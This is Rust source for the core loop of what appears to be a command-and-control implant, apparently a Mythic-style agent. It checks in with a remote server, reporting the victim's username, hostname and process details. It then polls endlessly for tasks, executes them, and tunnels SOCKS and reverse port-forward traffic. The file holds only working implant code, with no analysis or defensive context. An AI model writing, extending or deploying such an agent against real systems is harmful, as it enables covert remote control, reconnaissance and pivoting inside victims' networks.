use crate::{
    codec::{Codec, CodecError},
    commands,
    config::AgentConfig,
    protocol::{Checkin, CheckinReply, GetTasking, TaskResponse, TaskingReply},
    proxy::{RpfwdManager, SocksManager},
    transport::{self, Transport, TransportError},
};
use std::{env, process, thread, time::Duration};

#[derive(Debug)]
pub enum AgentError {
    Codec(CodecError),
    Transport(TransportError),
    Checkin,
}

impl From<CodecError> for AgentError {
    fn from(value: CodecError) -> Self {
        Self::Codec(value)
    }
}
impl From<TransportError> for AgentError {
    fn from(value: TransportError) -> Self {
        Self::Transport(value)
    }
}

pub struct Agent {
    config: AgentConfig,
    codec: Codec,
    transport: Box<dyn Transport>,
    callback_uuid: String,
    responses: Vec<TaskResponse>,
    socks: SocksManager,
    rpfwd: RpfwdManager,
}

impl Agent {
    pub fn new(config: AgentConfig) -> Result<Self, AgentError> {
        let codec = Codec::from_b64(&config.key_b64)?;
        let transport = transport::create(&config.transport, &config.endpoint, &config.uri)?;
        Ok(Self {
            callback_uuid: config.payload_uuid.clone(),
            config,
            codec,
            transport,
            responses: Vec::new(),
            socks: SocksManager::new(),
            rpfwd: RpfwdManager::new(),
        })
    }

    pub fn run(&mut self) -> Result<(), AgentError> {
        self.checkin()?;
        loop {
            match self.cycle() {
                Ok(()) => {}
                Err(_error) => {
                    crate::diagnostic!("{_error:?}");
                }
            }
            thread::sleep(self.config.sleep_duration());
        }
    }

    fn checkin(&mut self) -> Result<(), AgentError> {
        let process_name = env::current_exe()
            .ok()
            .and_then(|p| p.file_name().map(|v| v.to_string_lossy().into_owned()))
            .unwrap_or_default();
        let body = Checkin {
            action: "checkin",
            uuid: &self.config.payload_uuid,
            user: env::var("USERNAME").unwrap_or_default(),
            host: env::var("COMPUTERNAME").unwrap_or_default(),
            pid: process::id(),
            architecture: "x64",
            process_name,
        };
        let outbound = self.codec.encode(&self.config.payload_uuid, &body)?;
        let inbound = self
            .transport
            .exchange(&outbound, Duration::from_secs(30))?;
        let (_, reply): (_, CheckinReply) = self.codec.decode(&inbound)?;
        if reply.status != "success" || reply.id.len() != 36 {
            return Err(AgentError::Checkin);
        }
        self.callback_uuid = reply.id;
        Ok(())
    }

    fn cycle(&mut self) -> Result<(), AgentError> {
        let request = GetTasking {
            action: "get_tasking",
            tasking_size: -1,
            get_delegate_tasks: true,
            responses: std::mem::take(&mut self.responses),
            socks: self.socks.drain(),
            rpfwd: self.rpfwd.drain(),
            delegates: Vec::new(),
        };
        let outbound = self.codec.encode(&self.callback_uuid, &request)?;
        let inbound = self
            .transport
            .exchange(&outbound, Duration::from_secs(30))?;
        let (_, reply): (_, TaskingReply) = self.codec.decode(&inbound)?;
        self.socks.ingest(reply.socks);
        self.rpfwd.ingest(reply.rpfwd);
        for task in reply.tasks {
            self.responses.push(commands::dispatch(task));
        }
        Ok(())
    }
}
